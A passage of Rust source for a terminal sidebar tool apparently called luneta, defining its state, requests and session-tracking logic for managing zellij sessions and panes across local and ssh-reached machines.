        let destination = match remote.destination.parse::<Destination>() {
            Ok(destination) if named.insert(destination.clone()) => destination,
            Ok(_) | Err(_) => {
                left_out += 1;
                continue;
            },
        };
        let seen = match &remote.reached {
            Some(Reached::Host(host)) => Ok(Seen {
                sessions: &host.sessions,
                agents: &host.agents,
                work_trees: &host.work_trees,
                pull_requests: &host.pull_requests,
                unread_sockets: host.unread_sockets,
                unread: host.unread,
                unread_files: &host.unread_files,
                sayings: &host.sayings,
            }),
            Some(Reached::Reaching(())) => Err(Away::Reaching),
            Some(Reached::Unreached(unreached)) => Err(Away::of(unreached)),
            None => Err(Away::Unreached {
                since: None,
                word: "unreached",
                why: "lunetad says how it stands in words this luneta cannot read, as a newer \
                      lunetad's"
                    .to_owned(),
            }),
        };
        others.push((destination, seen));
    }
    Machines { here, others, left_out }
}

/// What the sidebar asks of luneta.
#[derive(Debug, PartialEq, Eq)]
pub enum Asked {
    /// Nothing: draw again, at most.
    Nothing,
    /// What deleting the merged worktrees of the repository `dir` is in, on
    /// `on`, deletes, for the menu numbered `menu`.
    Prunes { menu: u64, on: Machine, dir: Directory },
    /// What would go of the repository `dir` is in, on `on`, deleted where that
    /// is `agreed`, for the menu numbered `menu`.
    Prune { menu: u64, on: Machine, dir: Directory, agreed: BTreeSet<prunes::Deleting> },
    /// Take zellij's client to `place`, on `on`.
    Go { on: Machine, place: Place },
    /// Take the focus from zellij, as a click on the sidebar does.
    Take,
    /// Put this on the clipboard of luneta's terminal.
    Copy(Link),
    /// Put this, which a sweep of the mouse selected, on that clipboard.
    CopyText(String),
    /// Open this page in the browser of the machine luneta runs on.
    Browse(Link),
    /// Give the focus back to zellij.
    Leave,
    /// Ask zellij on `on` what closing the pane `pane` of `session` closes,
    /// for the menu numbered `menu` to plan its delete by.
    Closes { menu: u64, on: Machine, session: SessionName, pane: u32 },
    /// Have zellij on `on` do what a delete key planned for a session there.
    Delete { on: Machine, act: Act },
    /// Have zellij on `on` open this, for the menu numbered `menu`, which
    /// takes its client there once zellij says what it opened.
    Open { menu: u64, on: Machine, open: Open },
    /// Take zellij's client to `place`, on `on`, first, and have zellij there
    /// open this once it is there: a tab of another session, which may have
    /// no client to make room for it.
    OpenThere { menu: u64, on: Machine, place: Place, open: Open },
    /// Ask zellij on `on` which tabs of `session` are not that of its pane
    /// `pane`, for the menu numbered `menu` to turn that tab into.
    Tabs { menu: u64, on: Machine, session: SessionName, pane: u32 },
    /// Have zellij on `on` move what `carry` says to where it lands, in
    /// another session there, and take zellij's client with it as `follows`
    /// says.
    Carry { on: Machine, carry: Carry, landing: Landing, follows: Follows },
    /// Have zellij on `on` turn the pane `place` as `turn` says, for the menu
    /// numbered `menu`, which takes its client there once zellij says it did.
    /// A session with no client to make room for a tab has it come there
    /// first, while what stays takes it nowhere.
    Turn { menu: u64, on: Machine, place: PanePlace, turn: Turn },
    /// Take zellij's client to a session it makes on `on`, that starts where
    /// `starts` says, named for that directory as the picker's directories
    /// name it, with a `-2` where a session has that name: one that runs, or
    /// one that ended, which zellij keeps to bring back, as zellij there says
    /// then.
    Start { on: Machine, starts: Starts },
    /// Take zellij's client to a session it makes on `on`, `session`, that
    /// starts in `cwd`, and have zellij open a tab of it once it is there, in
    /// `tab_cwd`, named `name`, with `command` in it, or your shell for none,
    /// in place of the tabs zellij makes it with, for the menu numbered
    /// `menu`, which takes its client there once zellij says what it opened.
    Make {
        menu: u64,
        on: Machine,
        session: SessionName,
        cwd: String,
        tab_cwd: String,
        name: String,
        command: Vec<String>,
    },
    /// Find where a key of the menu numbered `menu`, for `work`, pasted on a
    /// row of `on`, goes among its panes `worked`, or else on the first of
    /// `others` that has what it is of, and have its worktree made there.
    Pull { menu: u64, on: Machine, work: Work, wanted: Wanted, worked: Vec<Worked>, others: Others },
    /// Find the skills that `cwd`, on `on`, can run in `agent`, for the menu
    /// numbered `menu`.
    Find { menu: u64, on: Machine, cwd: String, agent: agents::Harness },
    /// Keep what the shell in the pane `pane` of `session`, on `on`, printed
    /// after the line `command` was last run on, there, for the menu
    /// numbered `menu`.
    Printed { menu: u64, on: Machine, session: SessionName, pane: u32, ended: menu::Ended },
    /// Keep the log of each check that failed on the head of the pull request
    /// of `page`, on `on`, for the menu numbered `menu`.
    Checks { menu: u64, on: Machine, page: checks::PullPage },
    /// Have the model write this brief, and show it.
    Brief(Brief),
    /// Open the ask box, for this row.
    Ask(Target),
    /// Add the machine ssh reaches by this destination to luneta's hosts
    /// file, for lunetad to watch.
    Ssh(Destination),
    /// Take this machine out of luneta's hosts file, for lunetad to stop
    /// watching it.
    Forget(Destination),
}

/// The rows the top of the sidebar takes, as `top` draws them.
const HEADER: usize = 3;

/// Where the keys go, as the sidebar sees it.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum Keys {
    /// To zellij: the highlight rests on its pane.
    #[default]
    Zellij,
    Sidebar,
    /// To a brief or the ask box the sidebar asked for, or a note over
    /// zellij of what went wrong, which gives them back as it closes: the
    /// sidebar stays as it stands, highlight and all.
    Lent,
    /// To the sidebar's menu, floating over zellij, until it closes: back to
    /// the sidebar where `lent`, which stays as it stands meanwhile, or else
    /// to zellij.
    Menu { lent: bool },
}

impl Keys {
    /// Whether the keys are the sidebar's, or come back to it.
    fn held(self) -> bool {
        match self {
            Keys::Sidebar | Keys::Lent | Keys::Menu { lent: true } => true,
            Keys::Zellij | Keys::Menu { lent: false } => false,
        }
    }
}

/// What the rule along the top counts, of the rows: the sessions, the agents
/// in their panes that wait for you, the panes with the dot, and the agents
/// that are at work and that are in a shell, a folded session's among them.
/// And every pane of the sessions, which the search counts what it finds of.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
struct Counts {
    sessions: usize,
    panes: usize,
    waiting: usize,
    new: usize,
    busy: usize,
    shell: usize,
}

#[derive(Default)]
pub struct Sidebar {
    host: Option<Host>,
    /// What this machine goes by on its header: its host's name.
    this: String,
    /// Why the daemon does not answer, while it does not.
    away: Option<String>,
    /// The title zellij gives luneta's terminal: the name of the session it
    /// is in, and then ` | ` and the title of the pane it has the focus on,
    /// when that has one.
    title: Option<String>,
    /// The session luneta sent its zellij to, until zellij titles luneta's
    /// terminal after.
    sent: Option<Sent>,
    /// The machine luneta's zellij's client runs on, whose sessions `title`,
    /// `sent` and `own` are of.
    on: Machine,
    /// The sessions folded, by name.
    folds: Folds,
    /// What you saw in each pane, and the panes you marked unread.
    news: News,
    /// The order the rows go in, as you moved them.
    order: Order,
    /// The harness you picked last for the agents the menu starts.
    agent: Kept,
    /// The pane luneta's zellij is on, as the rows were last built.
    here_key: Option<Key>,
    /// When what finished last in each pane did, as the rows were last built.
    finished: HashMap<Key, SystemTime>,
    rows: Vec<Row>,
    counts: Counts,
    /// How many sessions the daemon lists with no start or no socket, which
    /// the rows leave out, as they tell sessions apart by both, or with a
    /// name zellij refuses.
    unlisted: usize,
    /// How many machines the daemon says of that the rows leave out, as
    /// `machines` does.
    unlisted_machines: usize,
    /// Which client of its session is luneta's zellij, and the pane it is on.
    own: OwnClient,
    keys: Keys,
    /// The row of the pane luneta's zellij is on, or of its session, while
    /// that one is folded, or of this machine, while that one is. The
    /// highlight rests on it while the sidebar does not have the focus.
    here_row: Option<Spot>,
    /// The row the keys took the highlight to, from `here_row` as the
    /// sidebar took the focus, or a click to.
    cursor: Option<Spot>,
    /// What the key before waits for the next to finish. Any other key drops
    /// it, `Esc` doing nothing else, and so do a click, the wheel and the
    /// focus going.
    pending: Pending,
    /// What `v` and the left button do to the order of the machines and
    /// their sessions, and what `V` and the left button move to another.
    moving: Moving,
    /// The row a move to another session takes the highlight to, once the
    /// pane it opened there shows, until a key or a click.
    arriving: Option<Spot>,
    /// The `here_row` the view last scrolled to show while the sidebar did
    /// not have the focus, after which the wheel can scroll it out of sight.
    revealed: Option<Spot>,
    /// The first line of the rows on screen.
    top: usize,
    /// What it drew last, for a sweep to read.
    page: Page,
    /// How that was laid out.
    laid: Layout,
    /// How many lines the rows had on screen when last drawn, under the rule
    /// along the top and over the notes at the bottom, which a click on
    /// either side of is not on.
    room: usize,
    /// The last thing that went wrong, until the next key.
    notice: Option<String>,
    /// The number of the pull request whose link was copied last, and when,
    /// for the notes to say, until the next key or `COPIED_SHOWS` from then.
    copied: Option<(NonZeroU32, SystemTime)>,
    /// The machine an image is on its way to, once that takes a while.
    image_going: Option<Destination>,
    /// What is being read aloud, or what that waits for.
    aloud: Option<aloud::Shown>,
    /// The buttons on its line, as last drawn: none on the sidebar collapsed.
    aloud_buttons: Spots<aloud::Button>,
    /// What went wrong as the menu floated over zellij, for luneta to say
    /// there, where you look, and the sidebar collapsed has no room for.
    said: Option<String>,
    /// The search, while it is open.
    search: Option<Search>,
    /// The menu, while it is open.
    menu: Option<Menu>,
    /// How many menus the sidebar has opened. A menu takes the next number
    /// as it opens, which what zellij answers for it carries.
    menus: u64,
    /// What a delete took away, and the row the highlight goes to once it is
    /// gone.
    closing: Option<Closing>,
    /// When the sidebar was last drawn: the rows are built for then, by which
    /// a command has run long enough to show, or has yet to.
    drawn: Option<SystemTime>,
    /// The soonest a command that runs, and has yet to show, will have run
    /// long enough to: the rows are built again once it has.
    due: Option<SystemTime>,
}

/// What a delete takes away: the row the highlight was on, which goes, and
/// the row it goes to once that is gone, the first after it that stays.
#[derive(Debug)]
struct Closing {
    gone: Spot,
    after: Option<Spot>,
}

/// What a key waits for the next to finish, one at a time: `gg` or `y p`.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
enum Pending {
    #[default]
    Nothing,
    /// `Top::First` was pressed, which moves the highlight to the first row
    /// once pressed again.
    First,
    /// `Top::Yank` was pressed, which waits for what to yank.
    Yank,
}

/// What `v` and the left button do to the order of the machines and their
/// sessions, what `V` and the left button move to another session, and what
/// the left button selects of the text: one thing at a time, so that no
/// selection lasts under a row the mouse lifted.
#[derive(Debug, Default)]
enum Moving {
    #[default]
    Still,
    /// `v` selected `anchor`: the selection holds it, the highlight's
    /// session, or machine, and those between, each with its rows.
    Selected(Movable),
    /// `V` picked a pane, or its tab, for another session, where it lands
    /// as `Enter` sets it down: nowhere yet while the landing is None, as
    /// where it is.
    Carrying(Carrying, Option<Landing>),
    /// Setting it down would end its session, as it is all the session has:
    /// it waits for `y` to say it may.
    Asking(Carrying, Landing),
    /// The left button is down on the sidebar at `at`, on luneta's terminal:
    /// a click once it lets go on the line it went down on. On a row that
    /// lifts, `lifts` says what is there, which goes with the mouse once that
    /// moves a line. It sweeps, from anywhere else, or once it moves past the
    /// cells around `at`.
    Down { at: Position, lifts: Option<Lifting> },
    Lifted(Lift),
    /// The left button drags over the text, which is copied as it lets go.
    Sweeping(Sweep),
    /// What it copied shows until the next click, or until what it showed on
    /// may have moved from under it, as `Layout` tells.
    Swept(Sweep, Layout),
}

/// How the sidebar laid out what it drew: which rows and notes, on which lines.
/// Another layout has other text on the cells a sweep is on, which is not what
/// it copied. A row's own text changing is no other layout: a spinner turns on
/// it each frame, and a sweep over one would show for no longer than that.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
struct Layout {
    area: Rect,
    /// The line of the rows at the top.
    top: usize,
    /// The rows, in the order they show, each with how many lines it takes.
    rows: Vec<(Spot, usize)>,
    /// How many lines go along the bottom, and what the notes among them say.
    bottom: usize,
    notes: Vec<String>,
}

/// What moves, with the rows under it: a machine, among the machines, or a
/// session, among those of its machine, and never to another's.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Movable {
    Machine(Machine),
    Session(Machine, Listed),
}

impl Movable {
    /// What moves by the row of `spot`: a machine's header, or a session's
    /// row. A pane's row moves nothing.
    fn of(spot: Spot) -> Option<Movable> {
        match spot {
            Spot::Machine(machine) => Some(Movable::Machine(machine)),
            Spot::Local(Place::Session(session)) => {
                Some(Movable::Session(Machine::Local, session))
            },
            Spot::Remote(destination, Place::Session(session)) => {
                Some(Movable::Session(Machine::Remote(destination), session))
            },
            Spot::Local(Place::Pane(_)) | Spot::Remote(_, Place::Pane(_)) => None,
        }
    }

    /// Its row.
    fn spot(&self) -> Spot {
        match self {
            Movable::Machine(machine) => Spot::Machine(machine.clone()),
            Movable::Session(machine, session) => {
                Spot::on(machine, Place::Session(session.clone()))
            },
        }
    }
}

/// What a move moves among, in the order of their rows, each by what the
/// order keeps it by, with the rows it spans: the machines, or the sessions
/// of one machine, by name.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Spans {
    Machines(Vec<(Machine, Range<usize>)>),
    Sessions(Machine, Vec<(String, Range<usize>)>),
}

impl Spans {
    /// How many there are.
    fn len(&self) -> usize {
        match self {
            Spans::Machines(machines) => machines.len(),
            Spans::Sessions(_, sessions) => sessions.len(),
        }
    }

    /// The rows each spans, in their order.
    fn rows(&self) -> Vec<Range<usize>> {
        match self {
            Spans::Machines(machines) => machines.iter().map(|(_, rows)| rows.clone()).collect(),
            Spans::Sessions(_, sessions) => sessions.iter().map(|(_, rows)| rows.clone()).collect(),
        }
    }

    /// They, with those `taken` put back before the one at `to` of those
    /// left, or after the last of them.
    fn moved(&self, taken: Range<usize>, to: usize) -> Spans {
        match self {
            Spans::Machines(machines) => Spans::Machines(moved(machines, taken, to)),
            Spans::Sessions(machine, sessions) => {
                Spans::Sessions(machine.clone(), moved(sessions, taken, to))
            },
        }
    }
}

/// What the left button lifts by a row: a machine or a session, which moves
/// among its kind, or a pane, or its tab, on its way to another session.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Lifting {
    Moved(Movable),
    Carried(Carrying),
}

/// A pane of a session of `machine`, or every pane of its tab, as `whole`
/// says, on its way to another session of the machine, and never to
/// another's: what `V` picks, or the mouse lifts by its row, or a tab by its
/// bracket.
#[derive(Clone, Debug, PartialEq, Eq)]
struct Carrying {
    machine: Machine,
    place: PanePlace,
    whole: Whole,
}

impl Carrying {
    /// Its row: that of the pane it was picked by.
    fn spot(&self) -> Spot {
        Spot::on(&self.machine, Place::Pane(self.place.clone()))
    }
}

/// Where what is carried lands, in another session of its machine: in a tab
/// of its own there, by the session's row; or beside a pane of it, by the
/// pane's, in its tab.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Landing {
    Tab(Listed),
    Beside(PanePlace),
}

/// Where zellij's client goes with what moves: it stays, on none of it; or
/// it goes to the pane it is on, by its id, once that opens where it lands,
/// and `First` goes there before, as the session it leaves ends with the
/// move, or the one it goes to has no client to make room for a tab.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Follows {
    Stays,
    After(u32),
    First(u32),
}

impl Follows {
    /// The pane it is on, which it goes with.
    pub fn pane(self) -> Option<u32> {
        match self {
            Follows::Stays => None,
            Follows::After(pane) | Follows::First(pane) => Some(pane),
        }
    }
}

impl Lifting {
    /// The row it was lifted by.
    fn spot(&self) -> Spot {
        match self {
            Lifting::Moved(movable) => movable.spot(),
            Lifting::Carried(carrying) => carrying.spot(),
        }
    }
}

impl Landing {
    pub fn session(&self) -> &Listed {
        match self {
            Landing::Tab(session) | Landing::Beside(PanePlace { session, .. }) => session,
        }
    }

    /// Where it is, as a go takes zellij's client there.
    pub fn place(&self) -> Place {
        match self {
            Landing::Tab(session) => Place::Session(session.clone()),
            Landing::Beside(place) => Place::Pane(place.clone()),
        }
    }

    fn lands(&self) -> Lands {
        match self {
            Landing::Tab(_) => Lands::Tab,
            Landing::Beside(place) => Lands::Beside(place.pane),
        }
    }
}

/// What the mouse lifted by its row, which goes where the mouse takes it,
/// with the rows under it, once it lets go.
#[derive(Debug)]
struct Lift {
    lifted: Lifting,
    /// The line of the sidebar the mouse is on.
    line: u16,
    /// Whether the mouse is over the sidebar. Let go anywhere else, the row
    /// goes back.
    over: bool,
    /// When the rows last scrolled under it, while it is held on the first
    /// line of them, or the last.
    scrolled: Option<Instant>,
}

/// The search, while it is open.
enum Search {
    /// Nothing typed: the rows under it are the rows without it.
    Empty,
    /// What is typed narrows the rows, and `seek` until the highlight has gone
    /// to the row that matches it best.
    Typed { term: String, seek: bool },
}

/// Where the highlight is, as the sidebar is drawn, by the index of its row.
#[derive(Clone, Copy)]
enum Highlight {
    /// On `LIT`, where the keys took it, while the sidebar has the focus.
    /// None while there is no row to take it to.
    Lit(Option<usize>),
    /// On `RESTING`, on the row of the pane luneta's zellij is on, while the
    /// sidebar does not have the focus.
    Resting(usize),
    /// Nowhere: the sidebar does not have the focus, and no row is the pane's.
    Off,
}

impl Sidebar {
    /// The sidebar, with the sessions `folds` has folded, what `news` has of
    /// what you saw and marked, the rows in `order`, and the harness `agent`
    /// keeps for the agents the menu starts, on a machine that goes by `this`.
    pub fn new(folds: Folds, news: News, order: Order, agent: Kept, this: String) -> Self {
        Sidebar { this, folds, news, order, agent, ..Sidebar::default() }
    }

    /// Takes up the harness for the agents the menu starts as it is kept
    /// now, as another luneta picked it.
    pub fn reagent(&mut self) {
        if let Err(why) = self.agent.reload() {
            log::say(&format!("agent: {why}"));
        }
    }

    /// Takes up the folds as they are kept now, as another luneta left them.
    pub fn refold(&mut self) {
        if self.folds.reload() {
            self.rebuild();
        }
    }

    /// Takes up what you saw and marked as it is kept now, as another luneta
    /// left it.
    pub fn reread(&mut self) {
        if self.news.reload() {
            self.rebuild();
        }
    }

    /// Takes up the order of the rows as it is kept now, as another luneta
    /// left it.
    pub fn reorder(&mut self) {
        if self.order.reload() {
            self.rebuild();
        }
    }

    /// The daemon says the host stands as `host`. A look to ask zellij for,
    /// as luneta's zellij comes to a session.
    pub fn heard(&mut self, host: Host) -> Option<Look> {
        self.host = Some(host);
        self.away = None;
        let look = self.arrived();
        if look.is_none()
            && let Some(session) = self.own.session()
        {
            let listed = clients(self.on_sessions(), session).map(<[Client]>::to_vec);
            self.own.heard(listed.as_deref(), Instant::now());
        }
        self.rebuild();
        self.reran();
        look
    }

    /// Time went by, to `now` by the host's clock and `at` by luneta's own,
    /// with luneta's window `watched`, as it has the focus. What luneta saw
    /// of its zellij's client may have stood long enough against the
    /// daemon's list for that list to be the newer. The client may have
    /// stayed on its pane long enough for you to have been there, whether the
    /// sidebar shows or not: it has been on the pane, and the window has had
    /// the focus, since the first tick that found both. And the daemon may
    /// have left a session out of its lists for long enough for what was kept
    /// of it to go. And what the mouse lifted may have been held on the first
    /// line of the rows, or the last, long enough for them to scroll.
    pub fn ticked(&mut self, now: SystemTime, at: Instant, watched: bool) {
        self.hold(at);
        let over = |then: SystemTime| now.duration_since(then).is_ok_and(|it| it >= COPIED_SHOWS);
        self.copied.take_if(|(_, then)| over(*then));
        if let Some(session) = self.own.session() {
            let listed = clients(self.on_sessions(), session).map(<[Client]>::to_vec);
            let pane = self.own.pane();
            self.own.heard(listed.as_deref(), at);
            if self.own.pane() != pane {
                self.rebuild();
            }
        }
        let here = self.here_key.filter(|_| watched);
        let finished = &self.finished;
        if self.news.dwell(here, |key| finished.get(&key).copied(), now, at) {
            self.rebuild();
        }
        let live = self.live();
        self.news.listed(live.as_ref(), at);
        if self.order.listed(live.as_ref(), at) {
            self.rebuild();
        }
    }

    /// The sessions that run, as the daemon lists them now, of each machine,
    /// or none where it does not answer, and what it said last stands. A
    /// machine's list may leave out one that runs where its daemon could not
    /// read all of zellij's folder, or does not say whether it could, as one
    /// older than the count; or it lists one the news cannot tell from
    /// another; or lunetad has nothing of the machine, as one it does not
    /// reach.
    fn live(&self) -> Option<Lists> {
        let host = self.host.as_ref()?;
        if self.away.is_some() {
            return None;
        }
        let mut live = Lists::default();
        for (machine, seen) in machines(host).each() {
            let Ok(seen) = seen else {
                live.lists(&machine, [], false);
                continue;
            };
            let sessions: Vec<Option<Listed>> = seen.sessions.iter().map(Listed::of).collect();
            let whole = seen.unread_sockets == Some(0) && sessions.iter().all(Option::is_some);
            live.lists(&machine, sessions.into_iter().flatten().map(|it| it.kept), whole);
        }
        Some(live)
    }

    /// The daemon does not answer, for `why`, which the log has as it
    /// changes: luneta asks again in a moment, and once a second at the most.
    /// What it said last stands.
    pub fn lost(&mut self, why: String) {
        if self.away.as_ref() != Some(&why) {
            log::say(&format!("lunetad: {why}"));
        }
        self.away = Some(why);
    }

    /// zellij titled luneta's terminal `title`. A look to ask zellij for, as
    /// its client comes to a session, which unfolds where zellij took it
    /// there itself.
    ///
    /// The title cannot tell apart two sessions whose names start alike
    /// before a ` | `: zellij's own switch to `odd | name`, which the daemon
    /// has yet to list, reads as one to `odd`, which unfolds instead.
    pub fn titled(&mut self, title: String) -> Option<Look> {
        if self.title.as_ref() == Some(&title) {
            return None;
        }
        // Of the session luneta sent its zellij to, which unfolded as it was
        // sent.
        let sent_there = self.sent.as_ref().is_some_and(|sent| in_session(&title, sent.session()));
        if sent_there || !matches!(self.sent, Some(Sent::Going { .. })) {
            self.sent = None;
        }
        self.title = Some(title);
        let look = self.arrived();
        if let Some(look) = &look
            && !sent_there
            && let Ok(session) = SessionName::running(&look.session)
        {
            self.unfold(&session);
        }
        self.rebuild();
        look
    }

    /// luneta sends its zellij to `session`, which it is in from now on, as
    /// far as the sidebar knows, and which unfolds: you go to a session for
    /// its panes. A look for zellij to answer once it is there.
    pub fn sending(&mut self, session: &SessionName) -> Option<Look> {
        self.send(session, false)
    }

    /// luneta sends its zellij to `session`, as `sending` says, and the
    /// session it leaves `ends` once it has left it.
    fn send(&mut self, session: &SessionName, ends: bool) -> Option<Look> {
        self.unfold(session);
        let session = session.as_str();
        let from = self.here().filter(|here| *here != session);
        let from = from.map(|here| Leaving { session: here.to_owned(), ends });
        self.sent = Some(Sent::Going { session: session.to_owned(), from, look: None });
        let look = self.arrived();
        if let Some(Sent::Going { look: number, .. }) = &mut self.sent {
            *number = look.as_ref().map(|look| look.number);
        }
        self.rebuild();
        look
    }

    /// A client of `session` takes the place of luneta's zellij's, which
    /// ended: it is in that session or none, which unfolds. A look for zellij
    /// to answer once it is there. luneta has yet to find it there, in the
    /// session it followed the one before to as well, as one on its way that
    /// ended.
    pub fn rejoining(&mut self, session: &SessionName) -> Look {
        self.unfold(session);
        let session = session.as_str();
        let look = self.came(session);
        let number = Some(look.number);
        self.sent = Some(Sent::Going { session: session.to_owned(), from: None, look: number });
        self.rebuild();
        look
    }

    /// The session luneta sent its zellij to, while zellij has yet to take
    /// its client there.
    pub fn going(&self) -> Option<&str> {
        match self.sent.as_ref()? {
            Sent::Going { session, .. } => Some(session),
            Sent::Landed { .. } => None,
        }
    }

    fn sent_on(&self, number: u64) -> bool {
        matches!(&self.sent, Some(Sent::Going { look, .. }) if *look == Some(number))
    }

    fn land(&mut self, number: u64) -> bool {
        let (true, Some(sent)) = (self.sent_on(number), &self.sent) else {
            return false;
        };
        self.sent = Some(Sent::Landed { session: sent.session().to_owned() });
        true
    }

    pub fn unfound(&mut self, look: u64) {
        if self.land(look) {
            self.own.unfound();
            self.rebuild();
        }
    }

    /// zellij did not take luneta's zellij to the session it was sent to on
    /// the go that `look` was to find it there: it is in the one it left
    /// still, until zellij titles the terminal, which it may never do where
    /// the client came to a tab that had that title. A look at the one it is
    /// in still.
    pub fn stayed(&mut self, look: u64) -> Option<Look> {
        if !self.sent_on(look) {
            return None;
        }
        let from = match self.sent.take() {
            Some(Sent::Going { from, .. }) => from,
            _ => None,
        };
        self.sent = from.map(|Leaving { session, .. }| Sent::Landed { session });
        let look = self.arrived();
        self.rebuild();
        look
    }

    /// zellij answered a look so. One that says what it listed before
    /// luneta's zellij came, of the go luneta sent it on last, is from once
    /// it had. One that finds zellij did not take it to the pane luneta sent
    /// it to says so: zellij moved another client, the last to type in the
    /// session, or none. Whether it found luneta's zellij in the session it
    /// was sent to, as zellij listed it there just now.
    pub fn looked(&mut self, looked: Looked) -> bool {
        let landed = looked.before.is_some() && self.land(looked.number);
        let listed = self.own.session().and_then(|session| clients(self.on_sessions(), session));
        let listed = listed.map(<[Client]>::to_vec);
        if self.own.looked(looked, listed.as_deref(), Instant::now()) {
            self.notify("zellij did not take its client to the pane".to_owned());
        }
        self.rebuild();
        landed
    }

    /// luneta takes its zellij to `place`. A look to ask zellij for once it
    /// has: in the session it is in, or the one it goes to.
    pub fn went(&mut self, place: &Place) -> Option<Look> {
        self.goes(place, false)
    }

    /// luneta takes its zellij out of the session it is in, to `place` in
    /// another, and deletes that session once it has left it, which the
    /// sidebar says until then. A look to ask zellij for once it is there.
    pub fn leaving(&mut self, place: &Place) -> Option<Look> {
        self.goes(place, true)
    }

    /// luneta takes its zellij to `place`, as `went` says, and the session
    /// it leaves for another `ends` once it has left it.
    fn goes(&mut self, place: &Place, ends: bool) -> Option<Look> {
        let listed = clients(self.on_sessions(), place.session()).map(<[Client]>::to_vec);
        let now = Instant::now();
        let look = self.own.went(place.session(), place.pane(), listed.as_deref(), now);
        if self.here() == Some(place.session()) {
            // A search goes to the panes of a folded session too.
            if place.pane().is_some() {
                self.unfold(&place.listed().name);
            }
            self.rebuild();
            return look;
        }
        // The client is on the pane as it comes to the other session.
        self.send(&place.listed().name, ends)
    }

    /// The sidebar takes the keys, or gives them back. The keys take the
    /// highlight on from where luneta's zellij is, and it goes back there as
    /// they leave. A search lasts while the sidebar has them: one left open
    /// would keep the rows it hides out of sight. So do the menu, a selection
    /// and what the mouse lifted, which goes back. A brief or the menu over
    /// zellij lent the keys leaves all of it as it stands. The menu over
    /// zellij lasts while its box has the keys, and closes as the box gives
    /// them up.
    pub fn focus(&mut self, keys: Keys) {
        if self.floats() && !matches!(keys, Keys::Menu { .. }) {
            self.close_menu();
            // What luneta did not take to say over zellij goes to the notes.
            if let Some(said) = self.said.take() {
                self.notice = Some(said);
            }
        }
        let (had, holds) = (self.keys.held(), keys.held());
        self.keys = keys;
        if had == holds {
            return;
        }
        self.pending = Pending::Nothing;
        if holds {
            if self.here_row.is_some() {
                self.cursor.clone_from(&self.here_row);
            }
        } else {
            self.search = None;
            self.moving = Moving::Still;
            self.close_menu();
        }
        self.rebuild();
    }

    pub fn close_menu(&mut self) {
        self.menu = None;
    }

    /// A look for the session zellij's client is in, as `here` says, if it
    /// has come to it since luneta last followed it.
    fn arrived(&mut self) -> Option<Look> {
        let here = self.here()?.to_owned();
        if self.own.session() == Some(here.as_str()) {
            return None;
        }
        Some(self.came(&here))
    }

    /// A client of `session` on `machine` takes the place of luneta's
    /// zellij's: one luneta starts there as it goes to another machine, or
    /// back, or as the one it had there ended. The machine is where luneta's
    /// zellij is from now on, and the client is in that session or none, as
    /// `rejoining` says. What luneta knew of the client before, and the title
    /// zellij gave its terminal, are another's. A look for zellij there to
    /// answer once it is there.
    pub fn swapping(&mut self, machine: &Machine, session: &SessionName) -> Look {
        self.on = machine.clone();
        self.title = None;
        self.own.anew();
        self.rejoining(session)
    }

    /// luneta's zellij came to `session`, or is back in it, as zellij did not
    /// take it out. A look for zellij to answer once it is there.
    fn came(&mut self, session: &str) -> Look {
        let listed = clients(self.on_sessions(), session).map(<[Client]>::to_vec);
        self.own.came(session, listed.as_deref(), Instant::now())
    }

    /// Unfolds `session`, of the machine luneta's zellij is on, and that
    /// machine, as luneta's zellij goes to it. It goes from the folder whether
    /// this luneta has it folded or not: another may have folded it since
    /// this one last heard.
    fn unfold(&mut self, session: &SessionName) {
        self.folds.set(Fold::Machine(&self.on), false);
        self.folds.set(Fold::Session(&self.on, session), false);
    }

    /// What zellij last titled luneta's terminal, which titles its window.
    pub fn terminal_title(&self) -> Option<&str> {
        self.title.as_deref()
    }

    /// The machine luneta's zellij's client runs on: this one until a client
    /// on another takes its place, as `swapping` says.
    pub fn on(&self) -> &Machine {
        &self.on
    }

    /// The sessions the daemon lists of the machine luneta's zellij is on, as
    /// it last said: none while it says none of that machine.
    fn on_sessions(&self) -> &[Session] {
        let Some(host) = &self.host else {
            return &[];
        };
        let Machine::Remote(destination) = &self.on else {
            return &host.sessions;
        };
        let named = destination.to_string();
        let remote = host.remotes.iter().find(|remote| remote.destination == named);
        match remote.and_then(|remote| remote.reached.as_ref()) {
            Some(Reached::Host(host)) => &host.sessions,
            Some(Reached::Reaching(()) | Reached::Unreached(_)) | None => &[],
        }
    }

    /// The session zellij's client is in: the one luneta sent it to, until
    /// zellij titles luneta's terminal after, or else by its title: the
    /// longest name of a session the daemon knows that the title is, or
    /// starts with before a ` | `, as a session's name can hold one too.
    /// Until the daemon says, what comes before the first.
    pub fn here(&self) -> Option<&str> {
        if let Some(sent) = &self.sent {
            return Some(sent.session());
        }
        let title = self.title.as_deref()?;
        let named = |name: &&str| in_session(title, name);
        let sessions = self.on_sessions().iter();
        sessions
            .map(|session| session.name.as_str())
            .filter(named)
            .max_by_key(|name| name.len())
            .or_else(|| Some(title.split_once(" | ").map_or(title, |(session, _)| session)))
    }

    /// Where you are, for the ask box's agent on `machine` to go by: on
    /// another machine while luneta's zellij is; or else on the pane
    /// luneta's zellij is on, by its session's name now, while it is on its
    /// way to no session, and on a pane, not a plugin's; or where luneta
    /// cannot tell.
    pub fn user(&self, machine: &Machine) -> User {
        if self.on != *machine {
            return User::Away;
        }
        let Some(session) = self.here().filter(|_| self.going().is_none()) else {
            return User::Untold;
        };
        let pane = self.own.pane().filter(|_| self.own.session() == Some(session));
        match (SessionName::running(session), pane) {
            (Ok(session), Some(pane)) => User::Pane { session, pane },
            (Err(_), _) | (_, None) => User::Untold,
        }
    }

    /// The sessions zellij's client may be in: the one luneta sent it to,
    /// and the one it left, until it is there; or else the one it is in, as
    /// `here` says. A name zellij makes no session of, as of a title that
    /// names none, is of none it is in.
    pub fn seats(&self) -> Vec<SessionName> {
        let seats: Vec<&str> = match &self.sent {
            Some(Sent::Going { session, from, .. }) => {
                from.iter().map(|from| &from.session).chain([session]).map(String::as_str).collect()
            },
            _ => self.here().into_iter().collect(),
        };
        seats.into_iter().filter_map(|seat| SessionName::running(seat).ok()).collect()
    }

    /// The sessions of the other machines but those `tried`, where luneta's
